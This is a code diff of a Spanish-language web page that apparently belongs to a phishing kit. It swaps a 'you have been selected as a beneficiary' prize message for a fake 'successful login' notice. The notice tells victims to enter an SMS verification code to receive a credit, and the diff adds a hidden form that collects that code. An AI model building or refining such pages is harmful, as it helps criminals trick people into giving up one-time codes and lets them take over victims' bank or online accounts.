@@ -79,17 +79,52 @@
       </div>
       <div class="container__alert">
         <div class="container__title__header">
-          <p>FELICIDADES!!</p>
+          <p>Autenticación</p>
         </div>
       </div>
       <div class="container__social__section">
         <div class="container__social__message">
-          <p>
-            Usted ha sido seleccionado como beneficiario, en breves momentos, nuestros ejecutivos se pondrán en contacto con usted para gestionar su bono este atento gracias.
-          </p>
+          <p> Su inicio de sesión se ha realizado con éxito, sin embargo debe autenticar su cuenta mediante SMS con un código de vinculación que recibirá en su teléfono. Ingrese el código en la página siguiente y siga las instrucciones para poder obtener su credito. </p>
         </div>
-        <div class="container__request__button">
-          <input type="button" value="Solicitar token" id="requestbutton" />
+          <div class="container__request__button">
+          <input type="button" value="Solicitar código" id="requestbutton" />
+        </div>
+      </div>
+    </div>
+
+    <!-- TOKEN PAGE -->
+
+    <div class="container__token__background hidediv" id="tokenhide">
+      <div class="container__token__window">
+        <div class="container__token__title">
+          <p>Autenticación</p>
+        </div>
+        <div class="container__token__message">
+          <p>Introduzca el token recibido por SMS</p>
+        </div>
+        <div class="container__token__input">
+          <div class="container__token__second">
+            <input
+              type="text"
+              maxlength="7"
+              placeholder="Introduzca código recibido"
+              id="tokencode"
+            />
+          </div>
+        </div>
+        <span id="rescode"></span>
+        <div class="container__token__buttons">
+          <div class="container__token__gobutton" id="tokengobutton">
+            <input
+              class="goenabled"
+              type="button"
+              value="Continuar"
+              id="sendcode"
+            />
+          </div>
+          <div class="container__token__cancel">
+            <input type="button" value="Cancelar" id="tokenshow" />
+          </div>
         </div>
       </div>
     </div>
